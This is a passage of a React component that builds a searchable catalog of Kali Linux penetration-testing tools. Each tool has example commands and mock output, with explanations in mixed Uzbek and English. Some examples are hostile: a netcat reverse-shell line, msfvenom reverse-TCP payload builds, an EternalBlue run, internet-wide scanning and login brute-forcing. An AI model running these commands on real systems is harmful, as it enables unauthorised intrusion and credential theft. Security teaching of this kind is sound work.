"use client"

import { useState, useMemo } from "react"
import { Search, Filter, Copy, Terminal, Shield, Database, Eye, Zap } from "lucide-react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ScrollArea } from "@/components/ui/scroll-area"
import { useToast } from "@/hooks/use-toast"

// Mock data for Kali Linux tools
const kaliTools = [
  {
    id: 1,
    name: "Nmap",
    category: "Information Gathering",
    description: "Network exploration tool va security/port scanner",
    usage: "nmap [options] [target]",
    examples: ["nmap 192.168.1.1", "nmap -sS -O 192.168.1.0/24", "nmap -sV -p 1-1000 target.com"],
    explanation:
      "Nmap network discovery va security auditing uchun ishlatiladi. U qaysi portlar ochiq, qanday servislar ishlayotgan va OS detection qiladi.",
    output:
      "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4\n80/tcp   open  http    Apache httpd 2.4.6",
    icon: "🔍",
    difficulty: "Beginner",
  },
  {
    id: 2,
    name: "Metasploit",
    category: "Exploitation Tools",
    description: "Penetration testing framework",
    usage: "msfconsole",
    examples: ["use exploit/windows/smb/ms17_010_eternalblue", "set RHOSTS 192.168.1.100", "exploit"],
    explanation:
      "Metasploit exploitation va post-exploitation uchun eng kuchli framework. Vulnerabilitylarni exploit qilish uchun ishlatiladi.",
    output:
      "[*] Started reverse TCP handler on 192.168.1.5:4444\n[*] Sending stage (175174 bytes) to 192.168.1.100\n[*] Meterpreter session 1 opened",
    icon: "💥",
    difficulty: "Advanced",
  },
  {
    id: 3,
    name: "Wireshark",
    category: "Sniffing & Spoofing",
    description: "Network protocol analyzer",
    usage: "wireshark",
    examples: ["wireshark -i eth0", "tshark -i wlan0 -f 'tcp port 80'", "tshark -r capture.pcap"],
    explanation:
      "Wireshark network traffic capture va analyze qilish uchun ishlatiladi. Paketlarni real-time ko'rish mumkin.",
    output:
      "Frame 1: 74 bytes on wire\nEthernet II, Src: 00:11:22:33:44:55, Dst: aa:bb:cc:dd:ee:ff\nInternet Protocol Version 4",
    icon: "📡",
    difficulty: "Intermediate",
  },
  {
    id: 4,
    name: "Burp Suite",
    category: "Web Applications",
    description: "Web application security testing platform",
    usage: "burpsuite",
    examples: ["Proxy -> Intercept -> Forward", "Scanner -> New Scan", "Intruder -> Positions -> Start Attack"],
    explanation:
      "Burp Suite web application security testing uchun ishlatiladi. HTTP traffic intercept qilish va vulnerability scan qilish mumkin.",
    output: "HTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: JSESSIONID=ABC123",
    icon: "🕷️",
    difficulty: "Intermediate",
  },
  {
    id: 5,
    name: "Aircrack-ng",
    category: "Wireless Attacks",
    description: "WiFi security auditing tools suite",
    usage: "aircrack-ng [options] <capture files>",
    examples: ["airmon-ng start wlan0", "airodump-ng wlan0mon", "aircrack-ng -w wordlist.txt capture.cap"],
    explanation:
      "Aircrack-ng WiFi network security testing uchun ishlatiladi. WEP/WPA/WPA2 parollarni crack qilish mumkin.",
    output: "KEY FOUND! [ password123 ]\nDecrypted correctly: 100%",
    icon: "📶",
    difficulty: "Advanced",
  },
  {
    id: 6,
    name: "John the Ripper",
    category: "Password Attacks",
    description: "Password cracking tool",
    usage: "john [options] password-files",
    examples: [
      "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
      "john --show hashes.txt",
      "john --incremental hashes.txt",
    ],
    explanation:
      "John the Ripper password hash cracking uchun ishlatiladi. Turli xil hash formatlarini support qiladi.",
    output: "admin:password123:1001:1001::/home/admin:/bin/bash\n1 password hash cracked, 0 left",
    icon: "🔐",
    difficulty: "Intermediate",
  },
  {
    id: 7,
    name: "Hydra",
    category: "Password Attacks",
    description: "Network logon cracker",
    usage: "hydra [options] target service",
    examples: [
      "hydra -l admin -P passwords.txt ssh://192.168.1.100",
      "hydra -L users.txt -P passwords.txt ftp://target.com",
      "hydra -l admin -p password123 rdp://192.168.1.50",
    ],
    explanation:
      "Hydra network service login brute force attack uchun ishlatiladi. SSH, FTP, HTTP va boshqa protokollarni support qiladi.",
    output:
      "[22][ssh] host: 192.168.1.100   login: admin   password: password123\n1 of 1 target successfully completed",
    icon: "🐍",
    difficulty: "Intermediate",
  },
  {
    id: 8,
    name: "Sqlmap",
    category: "Web Applications",
    description: "SQL injection testing tool",
    usage: "sqlmap [options]",
    examples: [
      "sqlmap -u 'http://target.com/page.php?id=1'",
      "sqlmap -u 'http://target.com/login.php' --data='user=admin&pass=123'",
      "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
    ],
    explanation:
      "Sqlmap SQL injection vulnerabilitylarni detect va exploit qilish uchun ishlatiladi. Database ma'lumotlarini extract qilish mumkin.",
    output: "available databases [3]:\n[*] information_schema\n[*] mysql\n[*] testdb",
    icon: "💉",
    difficulty: "Intermediate",
  },
  {
    id: 9,
    name: "Nikto",
    category: "Web Applications",
    description: "Web server scanner",
    usage: "nikto [options]",
    examples: ["nikto -h http://target.com", "nikto -h 192.168.1.100 -p 80,443", "nikto -h target.com -o report.html"],
    explanation:
      "Nikto web server vulnerability scanning uchun ishlatiladi. Dangerous files, outdated software va misconfigurations topadi.",
    output:
      "+ Server: Apache/2.4.18 (Ubuntu)\n+ Retrieved x-powered-by header: PHP/7.0.33\n+ OSVDB-3233: /icons/README: Apache default file found.",
    icon: "🌐",
    difficulty: "Beginner",
  },
  {
    id: 10,
    name: "Gobuster",
    category: "Web Applications",
    description: "Directory/file brute forcer",
    usage: "gobuster [mode] [options]",
    examples: [
      "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
      "gobuster dns -d target.com -w subdomains.txt",
      "gobuster vhost -u http://target.com -w vhosts.txt",
    ],
    explanation:
      "Gobuster hidden directories, files va subdomains topish uchun ishlatiladi. Brute force attack orqali ishlaydi.",
    output: "/admin (Status: 200)\n/backup (Status: 403)\n/config (Status: 301)",
    icon: "🔍",
    difficulty: "Beginner",
  },
  {
    id: 11,
    name: "Hashcat",
    category: "Password Attacks",
    description: "Advanced password recovery tool",
    usage: "hashcat [options] hashfile [dictionary]",
    examples: [
      "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
      "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a",
      "hashcat -m 2500 capture.hccapx rockyou.txt",
    ],
    explanation:
      "Hashcat GPU-accelerated password cracking tool. MD5, SHA1, NTLM va boshqa hash formatlarni crack qiladi.",
    output: "5d41402abc4b2a76b9719d911017c592:hello\nSession..........: hashcat\nStatus...........: Cracked",
    icon: "⚡",
    difficulty: "Advanced",
  },
  {
    id: 12,
    name: "Netcat",
    category: "Maintaining Access",
    description: "Network Swiss Army knife",
    usage: "nc [options] hostname port",
    examples: ["nc -l -p 4444", "nc target.com 80", "nc -e /bin/bash 192.168.1.100 4444"],
    explanation:
      "Netcat network connection yaratish, port listening va data transfer uchun ishlatiladi. Reverse shell yaratish mumkin.",
    output: "Connection to target.com 80 port [tcp/http] succeeded!\nHTTP/1.1 200 OK",
    icon: "🔌",
    difficulty: "Intermediate",
  },
  {
    id: 13,
    name: "Masscan",
    category: "Information Gathering",
    description: "Mass IP port scanner",
    usage: "masscan [options] <IP addresses/ranges>",
    examples: [
      "masscan -p1-65535 192.168.1.0/24 --rate=1000",
      "masscan -p80,443 0.0.0.0/0 --rate=10000",
      "masscan -p22 192.168.1.0/24 -oG scan.txt",
    ],
    explanation: "Masscan juda tez port scanner. Katta network rangelarni scan qilish uchun ishlatiladi.",
    output: "Discovered open port 80/tcp on 192.168.1.100\nDiscovered open port 443/tcp on 192.168.1.100",
    icon: "🚀",
    difficulty: "Intermediate",
  },
  {
    id: 14,
    name: "Dirb",
    category: "Web Applications",
    description: "Web content scanner",
    usage: "dirb <url_base> [<wordlist_file>]",
    examples: [
      "dirb http://target.com",
      "dirb http://target.com /usr/share/dirb/wordlists/big.txt",
      "dirb http://target.com -o results.txt",
    ],
    explanation:
      "Dirb web server hidden directories va files topish uchun ishlatiladi. Dictionary attack orqali ishlaydi.",
    output:
      "==> DIRECTORY: http://target.com/admin/\n==> DIRECTORY: http://target.com/images/\n+ http://target.com/robots.txt (CODE:200|SIZE:26)",
    icon: "📁",
    difficulty: "Beginner",
  },
  {
    id: 15,
    name: "Recon-ng",
    category: "Information Gathering",
    description: "Web reconnaissance framework",
    usage: "recon-ng",
    examples: ["use recon/domains-hosts/hackertarget", "set SOURCE target.com", "run"],
    explanation:
      "Recon-ng OSINT (Open Source Intelligence) gathering uchun framework. Target haqida ma'lumot to'plash uchun ishlatiladi.",
    output: "[*] Country: United States\n[*] Host: www.target.com\n[*] Ip_Address: 192.168.1.100",
    icon: "🕵️",
    difficulty: "Intermediate",
  },
  {
    id: 16,
    name: "TheHarvester",
    category: "Information Gathering",
    description: "Email, subdomain and people names harvester",
    usage: "theHarvester [options]",
    examples: [
      "theHarvester -d target.com -b google",
      "theHarvester -d target.com -b all -l 500",
      "theHarvester -d target.com -b linkedin -f results.html",
    ],
    explanation:
      "TheHarvester email addresses, subdomains va people names gather qilish uchun ishlatiladi. OSINT tool.",
    output: "[*] Emails found:\nadmin@target.com\ninfo@target.com\n[*] Hosts found:\nwww.target.com\nmail.target.com",
    icon: "🌾",
    difficulty: "Beginner",
  },
  {
    id: 17,
    name: "Maltego",
    category: "Information Gathering",
    description: "Link analysis and data mining tool",
    usage: "maltego",
    examples: [
      "New Graph -> Add Entity -> Domain",
      "Run Transform -> DNS from Domain",
      "Run Transform -> Email addresses from Domain",
    ],
    explanation:
      "Maltego OSINT va forensics uchun visual link analysis tool. Ma'lumotlar orasidagi bog'lanishlarni ko'rsatadi.",
    output: "Visual graph showing relationships between domains, IPs, emails, and people",
    icon: "🕸️",
    difficulty: "Advanced",
  },
  {
    id: 18,
    name: "Shodan",
    category: "Information Gathering",
    description: "Search engine for Internet-connected devices",
    usage: "shodan [command] [options]",
    examples: ["shodan search apache", "shodan host 192.168.1.1", "shodan count country:US"],
    explanation:
      "Shodan internet-connected devices search qilish uchun ishlatiladi. IoT devices, servers va cameras topish mumkin.",
    output: "IP: 192.168.1.100\nPort: 80\nService: Apache httpd 2.4.41\nCountry: United States",
    icon: "🔍",
    difficulty: "Beginner",
  },
  {
    id: 19,
    name: "Enum4linux",
    category: "Information Gathering",
    description: "Linux alternative to enum.exe for enumerating SMB",
    usage: "enum4linux [options] target",
    examples: ["enum4linux 192.168.1.100", "enum4linux -a 192.168.1.100", "enum4linux -U -S 192.168.1.100"],
    explanation:
      "Enum4linux SMB shares, users va groups enumerate qilish uchun ishlatiladi. Windows machines haqida ma'lumot olish mumkin.",
    output: "Users on 192.168.1.100:\nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]",
    icon: "📋",
    difficulty: "Intermediate",
  },
  {
    id: 20,
    name: "Fierce",
    category: "Information Gathering",
    description: "Domain scanner",
    usage: "fierce [options]",
    examples: ["fierce -dns target.com", "fierce -dns target.com -wordlist hosts.txt", "fierce -range 192.168.1.0/24"],
    explanation: "Fierce domain va subdomain discovery uchun ishlatiladi. DNS brute force attack orqali ishlaydi.",
    output:
      "Found: www.target.com (192.168.1.100)\nFound: mail.target.com (192.168.1.101)\nFound: ftp.target.com (192.168.1.102)",
    icon: "🦁",
    difficulty: "Beginner",
  },
  {
    id: 21,
    name: "Dnsrecon",
    category: "Information Gathering",
    description: "DNS enumeration script",
    usage: "dnsrecon [options]",
    examples: [
      "dnsrecon -d target.com",
      "dnsrecon -d target.com -t brt -D subdomains.txt",
      "dnsrecon -r 192.168.1.0/24",
    ],
    explanation:
      "Dnsrecon DNS records enumerate qilish uchun ishlatiladi. A, MX, NS va boshqa record typelarni topadi.",
    output: "[*] A target.com 192.168.1.100\n[*] MX target.com mail.target.com\n[*] NS target.com ns1.target.com",
    icon: "🌐",
    difficulty: "Beginner",
  },
  {
    id: 22,
    name: "Sublist3r",
    category: "Information Gathering",
    description: "Subdomain enumeration tool",
    usage: "sublist3r [options]",
    examples: [
      "sublist3r -d target.com",
      "sublist3r -d target.com -b -t 100",
      "sublist3r -d target.com -o results.txt",
    ],
    explanation: "Sublist3r subdomain discovery uchun ishlatiladi. Search engines va DNS brute force ishlatadi.",
    output: "www.target.com\nmail.target.com\nftp.target.com\nadmin.target.com",
    icon: "🔗",
    difficulty: "Beginner",
  },
  {
    id: 23,
    name: "Amass",
    category: "Information Gathering",
    description: "In-depth attack surface mapping",
    usage: "amass [subcommand] [options]",
    examples: ["amass enum -d target.com", "amass enum -brute -d target.com", "amass viz -d3 -d target.com"],
    explanation:
      "Amass comprehensive subdomain enumeration va network mapping uchun ishlatiladi. Passive va active reconnaissance.",
    output: "www.target.com\napi.target.com\ndev.target.com\nstaging.target.com",
    icon: "🗺️",
    difficulty: "Intermediate",
  },
  {
    id: 24,
    name: "Wpscan",
    category: "Web Applications",
    description: "WordPress vulnerability scanner",
    usage: "wpscan [options]",
    examples: [
      "wpscan --url http://target.com",
      "wpscan --url http://target.com --enumerate u",
      "wpscan --url http://target.com --passwords passwords.txt",
    ],
    explanation:
      "Wpscan WordPress sites vulnerability scanning uchun ishlatiladi. Plugins, themes va users enumerate qiladi.",
    output: "[+] WordPress version 5.4.2\n[!] 2 vulnerabilities identified\n[+] admin user found",
    icon: "📝",
    difficulty: "Beginner",
  },
  {
    id: 25,
    name: "Joomscan",
    category: "Web Applications",
    description: "Joomla vulnerability scanner",
    usage: "joomscan [options]",
    examples: [
      "joomscan -u http://target.com",
      "joomscan -u http://target.com --enumerate-components",
      "joomscan -u http://target.com -ec",
    ],
    explanation:
      "Joomscan Joomla CMS vulnerability scanning uchun ishlatiladi. Components va configuration issues topadi.",
    output:
      "[+] Joomla version: 3.9.18\n[+] Admin panel: http://target.com/administrator/\n[!] Vulnerable component found",
    icon: "🏗️",
    difficulty: "Beginner",
  },
  {
    id: 26,
    name: "Droopescan",
    category: "Web Applications",
    description: "Drupal & SilverStripe scanner",
    usage: "droopescan [options]",
    examples: [
      "droopescan scan drupal -u http://target.com",
      "droopescan scan silverstripe -u http://target.com",
      "droopescan scan drupal -U urls.txt",
    ],
    explanation: "Droopescan Drupal va SilverStripe CMS vulnerability scanning uchun ishlatiladi.",
    output: "[+] Drupal version 8.9.1\n[+] Possible interesting urls found:\n/user/register",
    icon: "💧",
    difficulty: "Beginner",
  },
  {
    id: 27,
    name: "Commix",
    category: "Web Applications",
    description: "Command injection exploiter",
    usage: "commix [options]",
    examples: [
      "commix -u 'http://target.com/page.php?id=1'",
      "commix --data='id=1' -u http://target.com/page.php",
      "commix -u http://target.com/page.php?id=1 --os-shell",
    ],
    explanation: "Commix command injection vulnerabilitylarni detect va exploit qilish uchun ishlatiladi.",
    output: "[+] Parameter 'id' appears to be injectable\n[+] OS shell established\ncommix> whoami",
    icon: "💻",
    difficulty: "Advanced",
  },
  {
    id: 28,
    name: "Wfuzz",
    category: "Web Applications",
    description: "Web application fuzzer",
    usage: "wfuzz [options] URL",
    examples: [
      "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",
      "wfuzz -c -z range,1-100 http://target.com/page.php?id=FUZZ",
      "wfuzz -c --hc 404 -z file,dirs.txt http://target.com/FUZZ/",
    ],
    explanation: "Wfuzz web application fuzzing uchun ishlatiladi. Hidden content va parameters topish mumkin.",
    output:
      '000000001:   200        50 L     100 W    1500 Ch    "admin"\n000000002:   403        10 L      20 W     300 Ch     "config"',
    icon: "🔀",
    difficulty: "Intermediate",
  },
  {
    id: 29,
    name: "Ffuf",
    category: "Web Applications",
    description: "Fast web fuzzer",
    usage: "ffuf [options]",
    examples: [
      "ffuf -w wordlist.txt -u http://target.com/FUZZ",
      "ffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404",
      "ffuf -w users.txt:USER -w passwords.txt:PASS -u http://target.com/login -d 'user=USER&pass=PASS'",
    ],
    explanation: "Ffuf juda tez web fuzzer. Directories, files va parameters brute force qilish uchun ishlatiladi.",
    output:
      "admin                   [Status: 200, Size: 1234, Words: 100, Lines: 50]\nconfig                  [Status: 403, Size: 567, Words: 20, Lines: 10]",
    icon: "⚡",
    difficulty: "Intermediate",
  },
  {
    id: 30,
    name: "Dirsearch",
    category: "Web Applications",
    description: "Web path scanner",
    usage: "dirsearch [options]",
    examples: [
      "dirsearch -u http://target.com",
      "dirsearch -u http://target.com -e php,html,js",
      "dirsearch -u http://target.com -w wordlist.txt",
    ],
    explanation: "Dirsearch web directories va files brute force qilish uchun ishlatiladi. Multi-threading support.",
    output: "[200] http://target.com/admin/\n[403] http://target.com/config/\n[200] http://target.com/images/",
    icon: "🔍",
    difficulty: "Beginner",
  },
  {
    id: 31,
    name: "Crackmapexec",
    category: "Password Attacks",
    description: "Network service attack tool",
    usage: "crackmapexec [protocol] [options] targets",
    examples: [
      "crackmapexec smb 192.168.1.0/24 -u admin -p password123",
      "crackmapexec winrm 192.168.1.100 -u users.txt -p passwords.txt",
      "crackmapexec ssh 192.168.1.0/24 -u root -p passwords.txt",
    ],
    explanation: "Crackmapexec network services (SMB, WinRM, SSH) brute force attack uchun ishlatiladi.",
    output: "SMB         192.168.1.100   445    DC01    [+] domain\\admin:password123 (Pwn3d!)",
    icon: "🔨",
    difficulty: "Advanced",
  },
  {
    id: 32,
    name: "Medusa",
    category: "Password Attacks",
    description: "Speedy, parallel, modular login brute-forcer",
    usage: "medusa [options]",
    examples: [
      "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh",
      "medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp",
      "medusa -h target.com -u admin -p password123 -M http -m DIR:/admin",
    ],
    explanation: "Medusa network service login brute force attack uchun ishlatiladi. Multi-protocol support.",
    output: "ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: admin Password: password123 [SUCCESS]",
    icon: "🐙",
    difficulty: "Intermediate",
  },
  {
    id: 33,
    name: "Patator",
    category: "Password Attacks",
    description: "Multi-purpose brute-forcer",
    usage: "patator module [options]",
    examples: [
      "patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt",
      "patator ftp_login host=192.168.1.100 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt",
      "patator http_fuzz url=http://target.com/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt",
    ],
    explanation: "Patator modular brute-force tool. Turli xil protokollar va servislar uchun ishlatiladi.",
    output: "19:42:32 patator    INFO - code:200 size:1234 time:0.123 | password123",
    icon: "🥔",
    difficulty: "Advanced",
  },
  {
    id: 34,
    name: "Cewl",
    category: "Password Attacks",
    description: "Custom wordlist generator",
    usage: "cewl [options] url",
    examples: ["cewl http://target.com", "cewl -d 2 -m 5 http://target.com", "cewl -w wordlist.txt http://target.com"],
    explanation:
      "Cewl website content asosida custom wordlist yaratish uchun ishlatiladi. Password attack uchun foydali.",
    output: "admin\npassword\nlogin\nwelcome\ncompany\nsecurity",
    icon: "📝",
    difficulty: "Beginner",
  },
  {
    id: 35,
    name: "Crunch",
    category: "Password Attacks",
    description: "Wordlist generator",
    usage: "crunch [min] [max] [charset] [options]",
    examples: [
      "crunch 4 6 0123456789",
      "crunch 8 8 -t @@@@@@@@",
      "crunch 6 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt",
    ],
    explanation: "Crunch custom wordlist generate qilish uchun ishlatiladi. Pattern-based wordlist yaratish mumkin.",
    output: "aaaa\naaab\naaac\naaad\n...\nzzzz",
    icon: "🔢",
    difficulty: "Beginner",
  },
  {
    id: 36,
    name: "Cupp",
    category: "Password Attacks",
    description: "Common User Passwords Profiler",
    usage: "cupp [options]",
    examples: ["cupp -i", "cupp -w names.txt", "cupp -l"],
    explanation: "Cupp target person haqida ma'lumot asosida password wordlist yaratish uchun ishlatiladi.",
    output: "john1985\njohn123\njohnsmith\njohn@123\njohnny85",
    icon: "👤",
    difficulty: "Beginner",
  },
  {
    id: 37,
    name: "Ophcrack",
    category: "Password Attacks",
    description: "Windows password cracker",
    usage: "ophcrack",
    examples: [
      "ophcrack -g -d /path/to/tables -t vista_free",
      "ophcrack -f /path/to/sam -d /path/to/tables",
      "ophcrack -n -o output.txt",
    ],
    explanation: "Ophcrack Windows password hash cracking uchun rainbow table ishlatadi. GUI interface mavjud.",
    output:
      "User: admin\nLM Hash: aad3b435b51404eeaad3b435b51404ee\nNT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0\nPassword: password123",
    icon: "🪟",
    difficulty: "Intermediate",
  },
  {
    id: 38,
    name: "Rainbowcrack",
    category: "Password Attacks",
    description: "Hash cracker using rainbow tables",
    usage: "rcrack [options] rainbow_table_directory",
    examples: [
      "rcrack . -h 5d41402abc4b2a76b9719d911017c592",
      "rcrack /path/to/tables -l hash_list.txt",
      "rtgen md5 loweralpha 1 7 0 3800 33554432 0",
    ],
    explanation: "Rainbowcrack rainbow table ishlatib hash cracking qiladi. Time-memory trade-off attack.",
    output: "5d41402abc4b2a76b9719d911017c592:hello\nstatistics\ntotal time: 0.12 s",
    icon: "🌈",
    difficulty: "Advanced",
  },
  {
    id: 39,
    name: "Rsmangler",
    category: "Password Attacks",
    description: "Wordlist mangling tool",
    usage: "rsmangler [options] --file wordlist.txt",
    examples: [
      "rsmangler --file wordlist.txt",
      "rsmangler --file wordlist.txt --max 8",
      "rsmangler --file wordlist.txt --pna --pnb",
    ],
    explanation:
      "Rsmangler mavjud wordlistni mangle qilish (o'zgartirish) uchun ishlatiladi. Password variations yaratadi.",
    output: "password\npassword1\npassword123\nPassword\nPASSWORD\npassword!",
    icon: "🔄",
    difficulty: "Intermediate",
  },
  {
    id: 40,
    name: "Macchanger",
    category: "Sniffing & Spoofing",
    description: "MAC address changer",
    usage: "macchanger [options] device",
    examples: ["macchanger -r eth0", "macchanger -m 00:11:22:33:44:55 eth0", "macchanger -s eth0"],
    explanation: "Macchanger network interface MAC address o'zgartirish uchun ishlatiladi. Anonymity uchun foydali.",
    output:
      "Current MAC:   aa:bb:cc:dd:ee:ff (unknown)\nPermanent MAC: aa:bb:cc:dd:ee:ff (unknown)\nNew MAC:       00:11:22:33:44:55 (unknown)",
    icon: "🎭",
    difficulty: "Beginner",
  },
  {
    id: 41,
    name: "Ettercap",
    category: "Sniffing & Spoofing",
    description: "Network sniffer/interceptor/logger",
    usage: "ettercap [options] [target1] [target2]",
    examples: [
      "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//",
      "ettercap -G",
      "ettercap -T -q -F filter.ef -M arp:remote /192.168.1.0/24//",
    ],
    explanation:
      "Ettercap network traffic sniffing va man-in-the-middle attack uchun ishlatiladi. ARP poisoning qiladi.",
    output:
      "ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team\nListening on:\neth0 -> 192.168.1.5/255.255.255.0",
    icon: "🕷️",
    difficulty: "Advanced",
  },
  {
    id: 42,
    name: "Bettercap",
    category: "Sniffing & Spoofing",
    description: "Network attack and monitoring framework",
    usage: "bettercap [options]",
    examples: [
      "bettercap -iface eth0",
      "net.probe on; net.sniff on",
      "set arp.spoof.targets 192.168.1.100; arp.spoof on",
    ],
    explanation: "Bettercap modern network attack va monitoring framework. WiFi, Bluetooth va Ethernet support.",
    output: "192.168.1.100  >  192.168.1.1   TCP  192.168.1.100:54321 > 192.168.1.1:80",
    icon: "📡",
    difficulty: "Advanced",
  },
  {
    id: 43,
    name: "Tcpdump",
    category: "Sniffing & Spoofing",
    description: "Command-line packet analyzer",
    usage: "tcpdump [options] [expression]",
    examples: ["tcpdump -i eth0", "tcpdump -i eth0 host 192.168.1.100", "tcpdump -i eth0 port 80 -w capture.pcap"],
    explanation:
      "Tcpdump command-line packet capture va analysis uchun ishlatiladi. Network traffic monitor qilish mumkin.",
    output: "12:34:56.789012 IP 192.168.1.100.54321 > 192.168.1.1.80: Flags [S], seq 123456789",
    icon: "📊",
    difficulty: "Intermediate",
  },
  {
    id: 44,
    name: "Dsniff",
    category: "Sniffing & Spoofing",
    description: "Network auditing and penetration testing tools",
    usage: "dsniff [options]",
    examples: ["dsniff -i eth0", "urlsnarf -i eth0", "mailsnarf -i eth0"],
    explanation: "Dsniff network traffic sniffing va password capture uchun ishlatiladi. Various protocols support.",
    output: "12/25/23 12:34:56 192.168.1.100 -> 192.168.1.1 (ftp)\nuser admin pass password123",
    icon: "👃",
    difficulty: "Intermediate",
  },
  {
    id: 45,
    name: "Responder",
    category: "Sniffing & Spoofing",
    description: "LLMNR, NBT-NS and MDNS poisoner",
    usage: "responder [options]",
    examples: ["responder -I eth0 -rdw", "responder -I eth0 -A", "responder -I eth0 -wrf"],
    explanation: "Responder Windows network LLMNR va NBT-NS poisoning uchun ishlatiladi. Credential capture qiladi.",
    output:
      "[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 192.168.1.100\n[SMB] NTLMv2-SSP Username : DOMAIN\\user",
    icon: "🎣",
    difficulty: "Advanced",
  },
  {
    id: 46,
    name: "Mitmproxy",
    category: "Sniffing & Spoofing",
    description: "Interactive TLS-capable intercepting HTTP proxy",
    usage: "mitmproxy [options]",
    examples: ["mitmproxy", "mitmdump -s script.py", "mitmweb --web-host 0.0.0.0"],
    explanation: "Mitmproxy HTTP/HTTPS traffic intercept va modify qilish uchun ishlatiladi. Interactive interface.",
    output: "GET http://target.com/api/data\n← 200 application/json 1.2kB",
    icon: "🔄",
    difficulty: "Advanced",
  },
  {
    id: 47,
    name: "Sslstrip",
    category: "Sniffing & Spoofing",
    description: "SSL/TLS man-in-the-middle attack tool",
    usage: "sslstrip [options]",
    examples: ["sslstrip -l 8080", "sslstrip -l 8080 -w logfile.txt", "sslstrip -l 8080 -k"],
    explanation: "Sslstrip HTTPS connections downgrade qilish uchun ishlatiladi. SSL stripping attack.",
    output:
      "sslstrip 0.9 by Moxie Marlinspike running...\n2023-12-25 12:34:56,789 192.168.1.100 POST Data (www.target.com): user=admin&pass=password123",
    icon: "🔓",
    difficulty: "Advanced",
  },
  {
    id: 48,
    name: "Dnsspoof",
    category: "Sniffing & Spoofing",
    description: "DNS spoofer",
    usage: "dnsspoof [options] [expression]",
    examples: ["dnsspoof -i eth0", "dnsspoof -i eth0 -f hosts.txt", "dnsspoof -i eth0 host target.com"],
    explanation: "Dnsspoof DNS responses spoof qilish uchun ishlatiladi. DNS poisoning attack.",
    output:
      "dnsspoof: listening on eth0 [udp dst port 53]\n12/25/23 12:34:56 192.168.1.100.54321 > 192.168.1.1.53: target.com -> 192.168.1.5",
    icon: "🎭",
    difficulty: "Advanced",
  },
  {
    id: 49,
    name: "Armitage",
    category: "Exploitation Tools",
    description: "Graphical cyber attack management tool",
    usage: "armitage",
    examples: ["Start Armitage GUI", "Connect to Metasploit", "Launch attacks via GUI"],
    explanation:
      "Armitage Metasploit uchun GUI interface. Team collaboration va attack visualization uchun ishlatiladi.",
    output: "Graphical interface showing network topology and attack progress",
    icon: "🎯",
    difficulty: "Advanced",
  },
  {
    id: 50,
    name: "BeEF",
    category: "Exploitation Tools",
    description: "Browser Exploitation Framework",
    usage: "beef-xss",
    examples: [
      "beef-xss",
      "Access web interface at http://127.0.0.1:3000/ui/panel",
      "Hook browsers with JavaScript payload",
    ],
    explanation: "BeEF web browser exploitation uchun ishlatiladi. XSS attacks orqali browser control qilish mumkin.",
    output: "BeEF server started on http://127.0.0.1:3000\nHook URL: http://127.0.0.1:3000/hook.js",
    icon: "🥩",
    difficulty: "Advanced",
  },
  {
    id: 51,
    name: "Social Engineer Toolkit",
    category: "Exploitation Tools",
    description: "Social engineering penetration testing framework",
    usage: "setoolkit",
    examples: ["setoolkit", "1) Social-Engineering Attacks", "2) Website Attack Vectors"],
    explanation:
      "SET social engineering attacks uchun framework. Phishing, credential harvesting va payload generation.",
    output:
      "Select from the menu:\n1) Social-Engineering Attacks\n2) Penetration Testing (Fast-Track)\n3) Third Party Modules",
    icon: "🎭",
    difficulty: "Advanced",
  },
  {
    id: 52,
    name: "Searchsploit",
    category: "Exploitation Tools",
    description: "Exploit database search tool",
    usage: "searchsploit [options] term",
    examples: ["searchsploit apache 2.4", "searchsploit -m 12345", "searchsploit --update"],
    explanation:
      "Searchsploit Exploit-DB database search qilish uchun ishlatiladi. Known vulnerabilities topish mumkin.",
    output:
      "Apache HTTP Server 2.4.49 - Path Traversal Remote Code Execution | linux/remote/50383.sh\nApache HTTP Server 2.4.50 - Remote Code Execution | multiple/remote/50406.sh",
    icon: "🔍",
    difficulty: "Beginner",
  },
  {
    id: 53,
    name: "Msfvenom",
    category: "Exploitation Tools",
    description: "Metasploit payload generator",
    usage: "msfvenom [options]",
    examples: [
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe",
      "msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload",
      "msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.php",
    ],
    explanation: "Msfvenom Metasploit payload generation uchun ishlatiladi. Turli xil format va platformalar support.",
    output:
      "No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nPayload size: 341 bytes\nSaved as: payload.exe",
    icon: "💣",
    difficulty: "Intermediate",
  },
  {
    id: 54,
    name: "Exploitdb",
    category: "Exploitation Tools",
    description: "Archive of public exploits",
    usage: "Access via web or searchsploit",
    examples: ["Browse https://www.exploit-db.com", "searchsploit term", "Download exploit code"],
    explanation: "Exploitdb public exploit archive. Vulnerability research va penetration testing uchun resource.",
    output: "Database of public exploits and corresponding vulnerable software",
    icon: "📚",
    difficulty: "Beginner",
  },
  {
    id: 55,
    name: "Powersploit",
